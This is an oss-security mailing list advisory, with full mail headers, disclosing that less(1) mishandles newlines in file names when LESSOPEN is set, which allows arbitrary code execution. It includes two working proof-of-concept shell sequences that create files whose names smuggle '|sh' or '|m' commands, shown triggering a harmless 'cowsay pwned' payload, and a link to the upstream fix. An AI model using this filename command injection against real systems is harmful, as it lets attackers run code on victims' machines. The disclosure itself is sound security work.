Received: (qmail 28142 invoked by uid 550); 12 Apr 2024 12:20:59 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 28109 invoked from network); 12 Apr 2024 12:20:59 -0000
Authentication-Results: garm.ovh; auth=pass (GARM-98R0027b678fbc-eca2-4727-846d-3d3eff6f30fa,
                    85A3E892C6963C1368CED7EEBE9CFA9DF350C9AD) smtp.auth=jwilk@jwilk.net
X-OVh-ClientIp: 31.0.177.245
Date: Fri, 12 Apr 2024 14:20:31 +0200
From: Jakub Wilk <jwilk@jwilk.net>
To: <oss-security@lists.openwall.com>
Message-ID: <20240412122031.pt2sx6rasca3mgpu@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
MIME-Version: 1.0
Content-Type: text/plain; charset="us-ascii"; format=flowed
Content-Disposition: inline
X-Originating-IP: [37.59.142.98]
X-ClientProxiedBy: DAG5EX1.mxp6.local (172.16.2.41) To DAG4EX1.mxp6.local
 (172.16.2.31)
X-Ovh-Tracer-GUID: 1ad401fd-430d-4524-9b7b-9db22b9190db
X-Ovh-Tracer-Id: 2815312718239553303
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 0
X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrgedvledrudeiuddghedtucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfdpvefjgfevmfevgfenuceurghilhhouhhtmecuhedttdenucenucfjughrpeffhffvuffkgggtughisehttdertddttddvnecuhfhrohhmpeflrghkuhgsucghihhlkhcuoehjfihilhhksehjfihilhhkrdhnvghtqeenucggtffrrghtthgvrhhnpeehvdeffefgkedvieegteeitdelvdeltdefvdffgefhvdfgkeetffejvdeifefhieenucffohhmrghinhepghhithhhuhgsrdgtohhmnecukfhppeduvdejrddtrddtrddupdefjedrheelrddugedvrdelkedpfedurddtrddujeejrddvgeehnecuvehluhhsthgvrhfuihiivgeptdenucfrrghrrghmpehinhgvthepuddvjedrtddrtddruddpmhgrihhlfhhrohhmpehjfihilhhksehjfihilhhkrdhnvghtpdhnsggprhgtphhtthhopedupdhrtghpthhtohepohhsshdqshgvtghurhhithihsehlihhsthhsrdhophgvnhifrghllhdrtghomhdpoffvtefjohhsthepmhhoheegkedpmhhouggvpehsmhhtphhouhht
Subject: [oss-security] less(1) with LESSOPEN mishandles \n in paths

less(1) does not correctly escape newlines in pathnames when 
constructing command line of the input preprocessor. If a user ran 
less(1) on files with untrusted names, this could result in execution of 
arbitrary code.

The input preprocessor is enabled by the LESSOPEN environment variable.
But if you didn't set it, don't worry, because zless(1) (or xzless(1), 
or zstdless(1)) sets it for you:

    $ echo 'cowsay pwned' > './\' && touch "$(printf '\n|sh')"
    $ zless ./*
     _______
    < pwned >
     -------
            \   ^__^
             \  (oo)\_______
                (__)\       )\/\
                    ||----w |
                    ||     ||
    ./
    |sh (file 1 of 2) (END) - Next: ./\

On Ubuntu systems, $LESSOPEN is set in ~/.bashrc by default, so the bug 
can be exploited even without the wrapper:

    $ mkdir m "$(printf '\n|m')" && touch "$(printf '\n|m/oo')" && echo 'cowsay pwned' > m/oo && chmod +x m/oo
    $ less ./*/*
     _______
    < pwned >
     -------
            \   ^__^
             \  (oo)\_______
                (__)\       )\/\
                    ||----w |
                    ||     ||
    ./
    |m/oo (file 1 of 2) (END) - Next: ./m/oo


Upstream fix:
https://github.com/gwsw/less/commit/007521ac3c95bc76

-- 
Jakub Wilk
